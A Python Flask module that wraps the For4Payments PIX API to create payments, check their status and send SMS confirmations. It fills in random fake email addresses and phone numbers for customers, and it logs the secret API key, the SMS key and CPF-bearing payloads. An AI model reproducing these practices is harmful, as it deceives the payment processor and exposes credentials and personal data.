import os
import requests
from datetime import datetime
from flask import current_app
from typing import Dict, Any, Optional
import random
import string

class For4PaymentsAPI:
    API_URL = "https://app.for4payments.com.br/api/v1"

    def __init__(self, secret_key: str):
        self.secret_key = secret_key

    def _get_headers(self) -> Dict[str, str]:
        return {
            'Authorization': self.secret_key,
            'Content-Type': 'application/json',
            'Accept': 'application/json'
        }

    def _generate_random_email(self, name: str) -> str:
        clean_name = ''.join(e.lower() for e in name if e.isalnum())
        random_num = ''.join(random.choices(string.digits, k=4))
        domains = ['gmail.com', 'yahoo.com', 'hotmail.com', 'outlook.com']
        domain = random.choice(domains)
        return f"{clean_name}{random_num}@{domain}"

    def _generate_random_phone(self) -> str:
        ddd = str(random.randint(11, 99))
        number = ''.join(random.choices(string.digits, k=8))
        return f"{ddd}{number}"

    def create_pix_payment(self, data: Dict[str, Any]) -> Dict[str, Any]:
        """Create a PIX payment request"""
        if not self.secret_key or len(self.secret_key) < 10:
            raise ValueError("Token de autenticação inválido")

        required_fields = ['name', 'email', 'cpf', 'amount']
        for field in required_fields:
            if field not in data or not data[field]:
                raise ValueError(f"Campo obrigatório ausente: {field}")

        try:
            amount_in_cents = int(float(data['amount']) * 100)
            if amount_in_cents <= 0:
                raise ValueError("Valor do pagamento deve ser maior que zero")

            cpf = ''.join(filter(str.isdigit, data['cpf']))
            if len(cpf) != 11:
                raise ValueError("CPF inválido")

            email = data.get('email')
            if not email or '@' not in email:
                email = self._generate_random_email(data['name'])

            phone = self._generate_random_phone()

            payment_data = {
                "name": data['name'],
                "email": email,
                "cpf": cpf,
                "phone": phone,
                "paymentMethod": "PIX",
                "amount": amount_in_cents,
                "items": [{
                    "title": "Regulariza Brasil",
                    "quantity": 1,
                    "unitPrice": amount_in_cents,
                    "tangible": True
                }]
            }

            current_app.logger.info(f"Request payload: {payment_data}")
            current_app.logger.info(f"Headers: {self._get_headers()}")

            current_app.logger.info("Enviando requisição para API For4Payments...")

            try:
                response = requests.post(
                    f"{self.API_URL}/transaction.purchase",
                    json=payment_data,
                    headers=self._get_headers(),
                    timeout=30
                )

                current_app.logger.info(f"Resposta recebida (Status: {response.status_code})")
                current_app.logger.debug(f"Resposta completa: {response.text}")

                if response.status_code == 200:
                    response_data = response.json()
                    current_app.logger.info(f"Resposta da API: {response_data}")

                    return {
                        'id': response_data.get('id') or response_data.get('transactionId'),
                        'pixCode': response_data.get('pixCode') or response_data.get('pix', {}).get('code'),
                        'pixQrCode': response_data.get('pixQrCode') or response_data.get('pix', {}).get('qrCode'),
                        'expiresAt': response_data.get('expiresAt') or response_data.get('expiration'),
                        'status': response_data.get('status', 'pending')
                    }
                elif response.status_code == 401:
                    current_app.logger.error("Erro de autenticação com a API For4Payments")
                    raise ValueError("Falha na autenticação com a API For4Payments. Verifique a chave de API.")
                else:
                    error_message = 'Erro ao processar pagamento'
                    try:
                        error_data = response.json()
                        if isinstance(error_data, dict):
                            error_message = error_data.get('message') or error_data.get('error') or '; '.join(error_data.get('errors', []))
                            current_app.logger.error(f"Erro da API For4Payments: {error_message}")
                    except Exception as e:
                        error_message = f'Erro ao processar pagamento (Status: {response.status_code})'
                        current_app.logger.error(f"Erro ao processar resposta da API: {str(e)}")
                    raise ValueError(error_message)

            except requests.exceptions.RequestException as e:
                current_app.logger.error(f"Erro de conexão com a API For4Payments: {str(e)}")
                raise ValueError("Erro de conexão com o serviço de pagamento. Tente novamente em alguns instantes.")

        except ValueError as e:
            current_app.logger.error(f"Erro de validação: {str(e)}")
            raise
        except Exception as e:
            current_app.logger.error(f"Erro inesperado ao processar pagamento: {str(e)}")
            raise ValueError("Erro interno ao processar pagamento. Por favor, tente novamente.")

    def check_payment_status(self, payment_id: str) -> Dict[str, Any]:
        """Check the status of a payment"""
        try:
            current_app.logger.info(f"[PROD] Verificando status do pagamento {payment_id}")
            response = requests.get(
                f"{self.API_URL}/transaction.getPayment",
                params={'id': payment_id},
                headers=self._get_headers(),
                timeout=30
            )

            current_app.logger.info(f"Status check response (Status: {response.status_code})")
            current_app.logger.debug(f"Status check response body: {response.text}")

            if response.status_code == 200:
                payment_data = response.json()
                current_app.logger.info(f"Payment data received: {payment_data}")

                # Get status directly from API response
                status = payment_data.get('status', 'PENDING')
                current_app.logger.info(f"Original payment status from For4: {status}")

                # If status is APPROVED, send SMS notification
                if status == 'APPROVED':
                    try:
                        # Extracting customer data
                        phone = payment_data.get('phone')
                        name = payment_data.get('name', '')
                        first_name = name.split()[0] if name else 'Cliente'
                        message = f"Olá {first_name}, seu pagamento PIX foi confirmado com sucesso. Agradecemos a preferência!"

                        current_app.logger.info(f"Preparing to send SMS to {phone} for {name}")

                        # Prepare SMS API request
                        sms_api_key = os.environ.get('SMS_API_KEY')
                        if sms_api_key and phone:
                            sms_params = {
                                'key': sms_api_key,
                                'type': '9',
                                'number': phone,
                                'msg': message
                            }
                            current_app.logger.info(f"Sending SMS with params: {sms_params}")
                            sms_response = requests.get('https://api.smsdev.com.br/v1/send', params=sms_params)
                            current_app.logger.info(f"SMS notification sent. Response: {sms_response.text}")
                        else:
                            current_app.logger.warning(f"SMS not sent - missing API key ({bool(sms_api_key)}) or phone number ({bool(phone)})")
                    except Exception as e:
                        current_app.logger.error(f"Error sending SMS notification: {str(e)}")

                return {
                    'status': status,
                    'pix_qr_code': payment_data.get('pixQrCode'),
                    'pix_code': payment_data.get('pixCode')
                }
            elif response.status_code == 404:
                current_app.logger.warning(f"Payment {payment_id} not found")
                return {'status': 'PENDING'}
            else:
                error_message = f"Failed to fetch payment status (Status: {response.status_code})"
                current_app.logger.error(error_message)
                return {'status': 'PENDING'}

        except Exception as e:
            current_app.logger.error(f"Error checking payment status: {str(e)}")
            return {'status': 'PENDING'}

def create_payment_api(secret_key: Optional[str] = None) -> For4PaymentsAPI:
    """Factory function to create For4PaymentsAPI instance"""
    if secret_key is None:
        secret_key = os.environ.get("FOR4PAYMENTS_SECRET_KEY")
        if not secret_key:
            raise ValueError("FOR4PAYMENTS_SECRET_KEY não configurada no ambiente")
    return For4PaymentsAPI(secret_key)